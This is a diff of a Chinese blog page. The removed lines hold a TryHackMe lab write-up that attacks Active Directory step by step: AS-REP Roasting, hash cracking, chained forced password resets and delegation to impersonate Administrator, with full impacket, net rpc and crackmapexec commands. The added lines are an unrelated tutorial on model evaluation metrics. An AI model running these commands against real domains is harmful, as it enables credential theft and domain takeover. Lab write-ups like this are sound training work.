-<p><img src="https://qingwan.top/images/2514.png" class="lazyload" data-srcset="https://qingwan.top/images/2514.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>然后将生成的zip文件导入<code>bloodhound</code>图形化界面中（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_56426046/article/details/126854991">安装教程参考</a> ），查看信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo neo4j start</span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure>
-<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>我们从上面的分析中看到，检查 <code>AS-REP Roastable</code> 用户，有 3 个用户。这表示以下三个用户支持 <code>AS-REP </code>。<br><img src="https://qingwan.top/images/2515.png" class="lazyload" data-srcset="https://qingwan.top/images/2515.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p> 我们生活中或者是工作中很多地方会用到大模型，那我们怎么去评估一个大模型他的效果是否好，是否符合我们的要求和标准呢？或者说我们该从哪些指标中知道我们还有哪些地方需要改进呢？<br>今天就给大家介绍几个在大模型的训练中常见的几个评估指标。</p>
+<p>这里先写几个比较常见，而且对于新手小白比较好理解的~</p>
+<h3 id="常见的评估指标"><a href="#常见的评估指标" class="headerlink" title="常见的评估指标"></a>常见的评估指标</h3><p>在了解下面这些常见评估指标之前，我们先了解几个机器学习中的概念。</p>
+<h4 id="TP，TN，FP，FN的理解"><a href="#TP，TN，FP，FN的理解" class="headerlink" title="TP，TN，FP，FN的理解"></a>TP，TN，FP，FN的理解</h4><p>TP(True Positive)：预测正例，实际结果也正（系统说对了）<br>TN(True Negative)：预测负例，实际结果也负（系统说对了）<br>FP(False Positive)：预测正例，实际结果却是负（系统说错了）<br>FN(False Negative)：预测负例，实际结果却是正（系统说错了）</p>
+<p>我们做个表格理解一下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>指标</strong></th>
+<th><strong>解释</strong></th>
+<th><strong>类比</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>TP</strong></td>
+<td>预测作弊且确实作弊</td>
+<td>抓到了真正的作弊者</td>
+</tr>
+<tr>
+<td><strong>TN</strong></td>
+<td>预测没作弊且确实没作弊</td>
+<td>没冤枉无辜的学生</td>
+</tr>
+<tr>
+<td><strong>FP</strong></td>
+<td>预测作弊但其实没作弊</td>
+<td>冤枉了好人</td>
+</tr>
+<tr>
+<td><strong>FN</strong></td>
+<td>预测没作弊但其实作弊</td>
+<td>漏掉了真正的作弊者</td>
+</tr>
+</tbody></table>
+<p>好啦，接下来我们就来看看常见的一些评估指标吧。</p>
+<h4 id="1️⃣-准确率-Accuracy"><a href="#1️⃣-准确率-Accuracy" class="headerlink" title="1️⃣ 准确率 (Accuracy)"></a>1️⃣ <strong>准确率 (Accuracy)</strong></h4><p><code>定义</code>：预测正确的比例。<br><code>类比</code>：<br>想象你是老师，班上有100个学生，期末考试你要判断每个学生是“及格”还是“不及格”。</p>
 <ul>
-<li><code>ERNESTO_SILVA@THM.CORP</code></li>
-<li><code>TABATHA_BRITT@THM.CORP</code></li>
-<li><code>LEANN_LONG@THM.CORP</code></li>
+<li>如果你正确判断了90个学生的成绩（不管及格还是不及格），那么<strong>准确率</strong>就是：<br>  <strong><code>准确率 = 90 / 100 *100%= 90%</code></strong><br><code>总结</code>：<br>准确率只看总的预测正确率，但不关心错误的细节。<br>计算即：<strong>预测正确的&#x2F;总预测数</strong></li>
 </ul>
-<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>接下来我们就利用这几个用户，使用<code>AS-REP Roasting</code>攻击。</p>
-<p><code>AS-REP Roasting</code>攻击利用了Kerberos协议中的弱点，其中AS-REP请求是一种允许用户使用预身份的请求，而不需要提供密码。攻击者可以通过发送特制的AS-REP请求，从域控制器获取目标用户的加密AS-REP票据。<br>这个攻击的利用前提为：</p>
-<blockquote>
-<p>需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “。但是该属性是默认不勾选的。</p>
-</blockquote>
-<p>我们使用<code>impacket</code>的<code>GetNPUsers.py</code>脚本来分别请求这三个用户的TGT票据，记得要把ip写上噢</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers thm.corp/ERNESTO_SILVA -request -no-pass -dc-ip 10.10.234.211</span><br><span class="line">impacket-GetNPUsers thm.corp/TABATHA_BRITT -request -no-pass -dc-ip 10.10.234.211</span><br><span class="line">impacket-GetNPUsers thm.corp/LEANN_LONG -request -no-pass -dc-ip 10.10.234.211</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/2516.png" class="lazyload" data-srcset="https://qingwan.top/images/2516.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>接下来分别用<code>john</code> （我用<code>hashcat</code>没有爆出来）对这三个结果进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">john 2.txt --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">john 3.txt --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>
-<p>只有第二个<code>TABATHA_BRITT</code>用户爆破出了密码，为<code>marlboro(1985)</code><br>可以用 <code>john --show 2.txt</code> 显示密码</p>
-<p>这里后面我再试了一下，<code>hashcat</code>也可以进行爆破<br>如果<code>$krb5asrep</code>后面没有<code>$23</code>的话，要在<code>$krb5asrep</code>后面添加<code>$23</code>拼接。才能变成<code>hashcat</code>可以识别的格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 2.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/2517.png" class="lazyload" data-srcset="https://qingwan.top/images/2517.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>然后我们争对<code>TABATHA_BRITT</code>用户再进行枚举</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.20.164 --dns-tcp -d THM.CORP -u &#x27;TABATHA_BRITT&#x27; -p &#x27;marlboro(1985)&#x27; -c All --zip</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/2518.png" class="lazyload" data-srcset="https://qingwan.top/images/2518.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>可以看到这里我们想到达 <code>DARLA_WINTERS</code> 的路线就是从<code>TABATHA_BRITT</code>到 <code>SHAWMA_BRAY</code> 的 <code>GenericAll</code>。然后将密码从 <code>SHAWMA_BRAY</code> 强制更改为 <code>CRUZZ_HALL</code>。最后从 <code>CRUZ_HALL </code>到 <code>DARLA_WINTERS</code> 的通用写入。<br>这里为什么我们要选择这条路线呢？我们可以看到这条路线最后的<code>WINTERS</code>用户可以到达<code>DOMAIN COMPUTERS</code>域控机器，聪明<code>BRITT</code>出发就只有这一条路线到域控<br><img src="https://qingwan.top/images/2519.png" class="lazyload" data-srcset="https://qingwan.top/images/2519.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>我们右键路线，选择<code>help</code><br><img src="https://qingwan.top/images/2520.png" class="lazyload" data-srcset="https://qingwan.top/images/2520.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>然后可以看到这里我们可以看到可以通过<code>RPC</code>使用<code>GenericAll</code>更改用户的密码。这也适用于 <code>ForceChangePassword</code> 和 <code>GenericWrite</code>。<br><img src="https://qingwan.top/images/2521.png" class="lazyload" data-srcset="https://qingwan.top/images/2521.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>由于 <code>TABATHA_BRITT</code> 具有 <code>SHAWNA_BRAY</code> 的 <code>GenericAll</code>，因此我们可以使用它来重置 <code>SHAWNA_BRAY</code> 的密码。<br>使用<code>net rpc</code>来实现这一点。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;SHAWNA_BRAY&quot; &quot;newPassword@2024&quot; -U &quot;thm.corp&quot;/&quot;TABATHA_BRITT&quot;%&quot;marlboro(1985)&quot; -S &quot;10.10.49.98&quot;</span><br><span class="line"></span><br><span class="line">net rpc password &quot;CRUZ_HALL&quot; &quot;newPassword@2024&quot; -U &quot;THM.CORP&quot;/&quot;SHAWNA_BRAY&quot;%&quot;newPassword@2024&quot; -S &quot;10.10.49.98&quot;</span><br><span class="line"></span><br><span class="line">net rpc password &quot;DARLA_WINTERS&quot; &quot;newPassword@2024&quot; -U &quot;THM.CORP&quot;/&quot;CRUZ_HALL&quot;%&quot;newPassword@2024&quot; -S &quot;10.10.49.98&quot;</span><br></pre></td></tr></table></figure>
-
-<p>来验证一下密码修改成功了没</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.49.98 -u DARLA_WINTERS -p &#x27;newPassword@2024&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/2522.png" class="lazyload" data-srcset="https://qingwan.top/images/2522.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>然后我们再对<code>DARLA_WINTERS</code>用户进行一下枚举</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.20.164 --dns-tcp -d THM.CORP -u &#x27;DARLA_WINTERS&#x27; -p &#x27;newPassword@2024&#x27; -c All --zip</span><br></pre></td></tr></table></figure>
-<p>我们看到<code>DARLA_WINTERS</code>用户，可以通过<code>CIFS</code>服务进行委派攻击<br><img src="https://qingwan.top/images/2523.png" class="lazyload" data-srcset="https://qingwan.top/images/2523.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p><code>Impacket</code> 的<code>getST</code>脚本将请求服务的<code>Ticket</code> 并将其保存为 <code>ccache</code>。如果帐户具有受限的委派权限，可以使用 <code>-impersonate</code> 标志代表其他用户请求票证。<br>在请求票据之前，我们先输入下面这个命令。这个命令可以从指定的 NTP 服务器上获取准确的时间，并将系统时间调整到与之同步。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s thm.corp</span><br></pre></td></tr></table></figure>
-<p>然后再开始获取票据，这里我试了好多次好多命令都没成功，最终执行下面这个命令成功了，我的感觉就是命令要尽量写的完整，ip和域名和用户名密码都尽量写上。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn &quot;cifs/haystack.thm.corp&quot; -dc-ip 10.10.20.164 -impersonate &quot;Administrator&quot; &quot;thm.corp/DARLA_WINTERS:newPassword@2024&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qingwan.top/images/2524.png" class="lazyload" data-srcset="https://qingwan.top/images/2524.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line">impacket-wmiexec -k -no-pass Administrator@HayStack.thm.corp</span><br></pre></td></tr></table></figure>
-<p>但是我这里在输入第二个命令的时候一直报错<br><img src="https://qingwan.top/images/2525.png" class="lazyload" data-srcset="https://qingwan.top/images/2525.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>提示找不到服务，这是由于没有解析我们的域名导致的<br>我们需要编辑下我们的<code>hosts</code>文件，文件位于<code>/etc/hosts</code>。我们在文件的任意位置加上</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">靶机IP    HayStack.thm.corp</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/2526.png" class="lazyload" data-srcset="https://qingwan.top/images/2526.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>然后再次尝试<br><img src="https://qingwan.top/images/2527.png" class="lazyload" data-srcset="https://qingwan.top/images/2527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>然后寻找第二个flag<br><img src="https://qingwan.top/images/2528.png" class="lazyload" data-srcset="https://qingwan.top/images/2528.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><img src="https://qingwan.top/images/2529.png" class="lazyload" data-srcset="https://qingwan.top/images/2529.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>为<code>THM&#123;RE_RE_RE_SET_AND_DELEGATE&#125;</code></p>
-<p>我们可以画一个这个靶场的总思路思维导图<br><img src="https://qingwan.top/images/2530.png" class="lazyload" data-srcset="https://qingwan.top/images/2530.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://jaxafed.github.io/posts/tryhackme-reset/#access-as-tabatha_britt">https://jaxafed.github.io/posts/tryhackme-reset/#access-as-tabatha_britt</a><br><a target="_blank" rel="noopener" href="https://0xb0b.gitbook.io/writeups/tryhackme/2024/reset#initial-access">https://0xb0b.gitbook.io/writeups/tryhackme/2024/reset#initial-access</a></p>
+<p><img src="https://qingwan.top/images/10291.png" class="lazyload" data-srcset="https://qingwan.top/images/10291.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<hr>
+<h4 id="2️⃣-精确率-Precision"><a href="#2️⃣-精确率-Precision" class="headerlink" title="2️⃣ 精确率 (Precision)"></a>2️⃣ <strong>精确率 (Precision)</strong></h4><p><code>定义</code>：预测为正的样本中，有多少是真正的正样本。<br><code>类比</code>：<br>假设你要找出班上作弊的学生（<strong>正样本</strong>），但你错把一些没作弊的同学也当成了作弊的。</p>
+<ul>
+<li>你标记了10个学生为作弊，但实际上只有8个是真的作弊，2个是冤枉的。<br>  <code>精确率 = 8 / (8 + 2) = 80%</code><br><code>总结</code>：<br>精确率关注的是<strong>你说对了多少</strong>——在预测为“正”的样本中，真正正确的有多少。<br><img src="https://qingwan.top/images/10292.png" class="lazyload" data-srcset="https://qingwan.top/images/10292.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>计算即：<strong>预测为正例并且确实为正例的例子&#x2F;预测为正例的例子</strong></li>
+</ul>
+<hr>
+<h4 id="3️⃣-召回率-Recall"><a href="#3️⃣-召回率-Recall" class="headerlink" title="3️⃣ 召回率 (Recall)"></a>3️⃣ <strong>召回率 (Recall)</strong></h4><p><code>定义</code>：所有正样本中，你找出了多少。<br><code>类比</code>：<br>假设班上总共有10个学生作弊，但你只找出了8个，还有2个漏掉了。</p>
+<ul>
+<li><strong>召回率 &#x3D; 8 &#x2F; 10 &#x3D; 80%</strong><br><code>总结</code>：<br>召回率关注的是<strong>你找全了吗</strong>——你预测出来的正样本，覆盖了所有正样本的多少。<br>计算即：<strong>预测为正例并且确实为正例的例子&#x2F;实际所有正例</strong><br><img src="https://qingwan.top/images/10293.png" class="lazyload" data-srcset="https://qingwan.top/images/10293.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>召回率也叫真正例率，所以同时还有对应着的误报率(假正例率)<br><img src="https://qingwan.top/images/10294.png" class="lazyload" data-srcset="https://qingwan.top/images/10294.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>计算即：<strong>预测为正例但是实际为反例的例子&#x2F;实际所有反例</strong></li>
+</ul>
+<hr>
+<h4 id="4️⃣-F1分数-F1-Score"><a href="#4️⃣-F1分数-F1-Score" class="headerlink" title="4️⃣ F1分数 (F1-Score)"></a>4️⃣ <strong>F1分数 (F1-Score)</strong></h4><p><code>定义</code>：精确率和召回率的平衡点。<br><code>类比</code>：<br>如果你只追求精确率（避免冤枉人），你可能会漏掉很多真正的作弊学生。<br>如果你只追求召回率（尽量多抓人），你可能会抓错很多无辜的学生。<br>F1分数就是<strong>在精确率和召回率之间找平衡</strong>，用公式：<br><img src="https://qingwan.top/images/10295.png" class="lazyload" data-srcset="https://qingwan.top/images/10295.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><code>总结</code>：<br>F1分数是<strong>平衡精确率和召回率的综合指标</strong>，适用于精确率和召回率都很重要的场景。</p>
+<hr>
+<h4 id="5️⃣-ROC曲线-ROC-Curve"><a href="#5️⃣-ROC曲线-ROC-Curve" class="headerlink" title="5️⃣ ROC曲线 (ROC Curve)"></a>5️⃣ <strong>ROC曲线 (ROC Curve)</strong></h4><p><code>定义</code>：描述模型的<strong>真阳性率（召回率）</strong> 和 <strong>假阳性率（误报率）</strong> 之间的关系。<br><code>类比</code>：<br>假设你有一个<strong>金属探测器</strong>，你可以调整灵敏度。灵敏度越高，更多的金属会被探测到（召回率高），但也会误报一些非金属物品（误报率高）。</p>
+<ul>
+<li><strong>ROC曲线</strong>就是当你调整探测器灵敏度时，<strong>召回率</strong>和<strong>误报率</strong>之间的变化情况。<br><code>总结</code>：<br>ROC曲线能帮你看到<strong>模型在不同阈值下的表现</strong>，并选择合适的阈值。</li>
+</ul>
+<hr>
+<h4 id="6️⃣-AUC值-Area-Under-the-Curve"><a href="#6️⃣-AUC值-Area-Under-the-Curve" class="headerlink" title="6️⃣ AUC值 (Area Under the Curve)"></a>6️⃣ <strong>AUC值 (Area Under the Curve)</strong></h4><p><code>定义</code>：ROC曲线下面积的大小。<br><code>类比</code>：<br>AUC值就是金属探测器的“好坏评分”。分数范围是<strong>0.5到1</strong>：</p>
+<ul>
+<li>AUC &#x3D; 0.5：完全随机猜测（比如瞎蒙）。</li>
+<li>AUC &#x3D; 1：完美模型。<br><code>总结</code>：<br>AUC值越大，模型就越好，说明它在不同阈值下都能稳定地把正负样本区分开。</li>
+</ul>
+<hr>
+<h3 id="什么时候重点关注什么指标？（应用场景）"><a href="#什么时候重点关注什么指标？（应用场景）" class="headerlink" title="什么时候重点关注什么指标？（应用场景）"></a>什么时候重点关注什么指标？（应用场景）</h3><p>上面介绍了几个指标，但是大家会有这样一个疑问么：<strong>如果这些指标在某些情况下的数值差别很大的时候，我应该更重点关注哪个指标？</strong><br>其实该重点关注什么，取决于这个指标重点影响什么，而所影响的东西在对应场景下对我们的重要性就决定了我们最应该关注的东西。</p>
+<ol>
+<li>准确率 (Accuracy) 适用的场景</li>
+</ol>
+<ul>
+<li>定义：所有预测中，预测正确的比例。</li>
+<li>适用场景：正负样本数量大致平衡，且误报和漏报的成本相近。<br>举例：</li>
+<li>学生考试成绩判定：<br>  系统只需正确判断及格或不及格，没必要特别关注误判或漏判的代价。</li>
+<li>天气预报（简单情况）：<br>  系统预测晴天和下雨的准确率更重要，只要总体准确就够了。<br><strong>总结：</strong><br><strong>当正负样本平衡且误报漏报代价相近</strong>时，准确率是很好的指标。</li>
+</ul>
+<ol start="2">
+<li>精确率 (Precision) 重要的场景</li>
+</ol>
+<ul>
+<li>定义：在所有预测为正的样本中，真正为正的比例。</li>
+<li>适用场景：你更关心避免误报（FP），不想冤枉无辜的人或对象。<br>举例：</li>
+<li>垃圾邮件检测系统：<br>  如果误判了重要的邮件（FP），把它丢进垃圾箱，会造成用户损失。<br>  <strong>重点：提高精确率</strong>，减少误报。</li>
+<li>疾病诊断筛查（非终极诊断）：<br>  如果诊断系统说一个健康人患有重病（FP），可能会引起恐慌和不必要的治疗。<br><strong>总结：</strong><br><strong>当误报的代价很高</strong>时，要重点关注<strong>精确率</strong>。</li>
+</ul>
+<ol start="3">
+<li>召回率 (Recall) 重要的场景</li>
+</ol>
+<ul>
+<li>定义：在所有正样本中，被成功预测为正的比例。</li>
+<li>适用场景：你更关心<strong>不漏掉正样本（FN）</strong>，即使多报一些无所谓。<br>举例：</li>
+<li>癌症筛查：<br>  如果漏掉了一个真正的癌症患者（FN），可能会导致悲剧。因此，宁愿误报一些无病患者（FP），也不能漏掉。</li>
+<li>安全系统的异常检测：<br>  在金融欺诈或黑客入侵检测中，漏掉一次攻击可能会带来巨大损失。因此<strong>尽可能地抓住所有异常</strong>。<br><strong>总结：</strong><br><strong>当漏报的代价很高</strong>时，要重点关注<strong>召回率</strong>。</li>
+</ul>
+<ol start="4">
+<li>F1分数 (F1-Score) 重要的场景</li>
+</ol>
+<ul>
+<li>定义：精确率和召回率的调和平均。适用于需要平衡两者的场景。<br>举例：</li>
+<li>搜索引擎：<br>  搜索结果要确保用户能找到所需内容（召回率高），同时不希望显示太多无关内容（精确率高）。<br>  <strong>重点：用F1分数</strong>来平衡精确率和召回率。</li>
+<li>医疗AI辅助诊断：<br>  精确率和召回率都很重要：既不能漏诊，也不能误诊太多。<br><strong>总结：</strong><br><strong>当精确率和召回率都很重要</strong>时，使用<strong>F1分数</strong>来平衡它们。</li>
+</ul>
+<ol start="5">
+<li>AUC-ROC 曲线</li>
+</ol>
+<ul>
+<li>定义：AUC衡量模型在不同阈值下的整体表现。</li>
+<li>适用场景：当需要衡量模型在不同阈值下的稳定性时。<br><strong>举例：</strong></li>
+<li>银行信用卡欺诈检测：<br>  银行可以根据不同需求调整模型的阈值（严格或宽松），而<strong>AUC可以全面反映模型的性能</strong>。<br>  如果AUC接近1，说明模型在各种阈值下表现都很好。<br><strong>总结：</strong><br><strong>当模型的阈值需要动态调整</strong>时，使用<strong>AUC-ROC</strong>来综合评价模型。</li>
+</ul>
+<p>我们来总结一下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>指标</strong></th>
+<th><strong>重点场景</strong></th>
+<th><strong>何时使用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>精确率</strong></td>
+<td>垃圾邮件过滤、疾病诊断等</td>
+<td>当误报代价高时，减少冤枉无辜者。</td>
+</tr>
+<tr>
+<td><strong>召回率</strong></td>
+<td>癌症筛查、欺诈检测等</td>
+<td>当漏报代价高时，尽可能抓住所有正样本。</td>
+</tr>
+<tr>
+<td><strong>F1分数</strong></td>
+<td>搜索引擎、AI辅助诊断等</td>
+<td>当精确率和召回率都很重要时，求平衡。</td>
+</tr>
+<tr>
+<td><strong>准确率</strong></td>
+<td>考试成绩判定、天气预报等</td>
+<td>当正负样本平衡且误漏报代价相近时。</td>
+</tr>
+<tr>
+<td><strong>AUC-ROC</strong></td>
+<td>银行欺诈检测等</td>
+<td>当模型需要在不同阈值下表现良好时。</td>
+</tr>
+</tbody></table>
+<p>上面就是一些大模型常见评估指标的定义和运用场景啦，如有错误或者有疑问，欢迎给我留言或者私聊我~</p>
 
   </div>
   
@@ -2794,10 +2830,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-02-25T17:49:14+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-10-29T22:13:34+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2024年2月25日</p>
+    <p>更新于：2024年10月29日</p>
   </a>
 </div>
 
@@ -2821,22 +2857,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2024/02/26/THM-Vulnversity/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>TryHackMe-vulnversity渗透靶场wp</p>
-          <p class='content'>TryHackMe-vulnversity渗透靶场wp
-
-靶场链接：https://tryhackme.com/room/vulnversity
-用nmap进行勘察使用nmap进行信息收集我们通...</p>
-        </a>
       
-      
-        <a class='next' href='/2024/01/28/BURP-SQL%E6%B3%A8%E5%85%A5/'>
-          <p class='title'>Burpsuite--SQL注入相关实验<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>本文讲了Burpsuite实验室中和SQL注入有关的18个实验的思路以及SQL注入的防御方法
+        <a class='next' href='/2024/06/12/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%91%A0/'>
+          <p class='title'>Java安全漫谈学习笔记③ -- Java反序列化 (7-9)<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>正式进入Java的反序列化，分析URLDNS链和CC1链
 
 
-实验Lab1：检索隐藏数据当检索参数category时，后台查询语句为：
-1SELECT * F...</p>
+从这一篇开始就在进入java的第一个漏洞了，也是最常用的一个漏洞-反序列化。
+PHP、Python和Java序列化方法的对比java...</p>
         </a>
       
     </div>
@@ -2852,7 +2880,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2024/02/25/THM-reset%E9%9D%B6%E5%9C%BAwp/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/10/23/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%B8%B8%E8%A7%81%E6%8C%87%E6%A0%87%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%BF%90%E7%94%A8/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2894,7 +2922,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9"><span class="toc-text">外部打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE"><span class="toc-text">匿名用户访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-theft%E7%94%9F%E6%88%90hash%E7%AA%83%E5%8F%96%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96hash%E5%80%BC"><span class="toc-text">ntlm theft生成hash窃取文件获取hash值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">委派攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol>
